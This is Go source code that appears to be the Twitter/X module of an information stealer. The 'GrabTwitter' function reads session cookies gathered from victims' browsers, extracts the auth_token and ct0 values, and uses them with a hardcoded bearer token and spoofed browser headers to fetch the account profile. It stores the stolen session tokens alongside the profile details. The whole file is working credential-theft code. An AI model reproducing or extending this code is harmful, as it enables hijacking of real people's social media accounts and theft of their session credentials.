package main

import (
	"bytes"
	"encoding/json"
	"log"
	"net/http"
	"time"
)

type twitterAccountResult struct {
	AuthToken      string
	Ct0            string
	Username       string
	DisplayName    string
	AvatarURL      string
	Email          string
	Phone          string
	FollowersCount int
	FollowingCount int
	TweetCount     int
	CreatedAt      time.Time
	Location       string
	Bio            string
	Verified       bool
	FoundIn        string
}

var twitterResults []twitterAccountResult

type twitterProfile struct {
	Name            string `json:"name"`
	ScreenName      string `json:"screen_name"`
	CreatedAt       string `json:"created_at"`
	ProfileImageURL string `json:"profile_image_url_https"`
	FollowersCount  int    `json:"followers_count"`
	FollowingCount  int    `json:"friends_count"`
	TweetCount      int    `json:"statuses_count"`
}

func getCookies() (string, string, string, string) {
	authToken, ct0, source, fullCookies := "", "", "", ""
	for _, cookie := range cookies {
		if cookie.URL == ".x.com" {
			fullCookies += cookie.Name + "=" + cookie.Value + "; "
			if cookie.Name == "auth_token" {
				authToken = cookie.Value
				source = cookie.BrowserName
			} else if cookie.Name == "ct0" {
				ct0 = cookie.Value
				source = cookie.BrowserName
			}
		}
	}

	return authToken, ct0, source, fullCookies
}

func getUserInfo(ct0, cookies string) *twitterProfile {
	req, err := http.NewRequest("POST", "https://api.x.com/1.1/account/update_profile.json", bytes.NewBuffer([]byte("")))
	if err != nil {
		return nil
	}

	req.Header.Set("Authorization", "Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA")
	req.Header.Set("x-csrf-token", ct0)
	req.Header.Set("x-twitter-active-user", "yes")
	req.Header.Set("x-twitter-client-language", "en")
	req.Header.Set("x-twitter-auth-type", "OAuth2Session")
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:143.0) Gecko/20100101 Firefox/143.0")
	req.Header.Set("Cookie", cookies)
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Accept-Language", "en-US,en;q=0.5")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Referer", "https://x.com/settings/profile")
	req.Header.Set("Origin", "https://x.com")
	req.Header.Set("Sec-Fetch-Dest", "empty")
	req.Header.Set("Sec-Fetch-Mode", "cors")
	req.Header.Set("Sec-Fetch-Site", "same-origin")
	// TODO: Add "X-client-transaction-id" header

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		log.Println("Non-OK HTTP status:", resp.StatusCode)
		var bodyBytes bytes.Buffer
		_, err := bodyBytes.ReadFrom(resp.Body)
		if err == nil {
			log.Println("Response body:", bodyBytes.String())
		}
		return nil
	}

	var result twitterProfile
	if err = json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return nil
	}

	return &result
}

func GrabTwitter() {
	authToken, ct0, source, fullCookies := getCookies()
	if authToken == "" || ct0 == "" {
		return
	}

	profile := getUserInfo(ct0, fullCookies)
	if profile == nil {
		return
	}

	parsedTime, err := time.Parse(time.RubyDate, profile.CreatedAt)
	if err != nil {
		return
	}
	twitterResults = append(twitterResults, twitterAccountResult{
		AuthToken:      authToken,
		Ct0:            ct0,
		Username:       profile.ScreenName,
		DisplayName:    profile.Name,
		AvatarURL:      profile.ProfileImageURL,
		FollowersCount: profile.FollowersCount,
		FollowingCount: profile.FollowingCount,
		TweetCount:     profile.TweetCount,
		CreatedAt:      parsedTime,
		FoundIn:        source,
	})
}
